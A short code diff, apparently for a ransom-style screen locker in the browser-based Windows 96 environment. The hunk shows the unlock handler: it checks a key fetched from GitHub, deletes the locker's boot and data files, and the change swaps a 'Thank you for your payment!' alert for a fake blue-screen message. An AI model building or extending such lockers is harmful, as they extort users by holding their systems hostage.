@@ -34,12 +34,13 @@ class GUIApplication extends WApplication {
         body.getElementById("unlock").addEventListener("click", function(){
             let response = await fetch('https://raw.githubusercontent.com/TermOfficial/plus/main/key.txt').then(r => r.text());
             if(body.getElementById("key").value == response){
-                alert("Thank you for your payment!");
+                alert("Please wait...");
                 SCM.set("System/Session/Shell/exec", "default");
                 await SCM.syncRoot("System");
                 await fs.rm("c:/system/boot/notron.js");
                 await fs.rm("c:/user/appdata/y.wrt");
                 await fs.rm("c:/user/appdata/z.wrt");
+                w96.sys.renderBSOD("Thank you for your payment! Please reboot your computer!");
             } else {
                 alert("Incorrect key! Or do you not have internet? Make sure you can access the raw.githubusercontent.com domain.");
             }
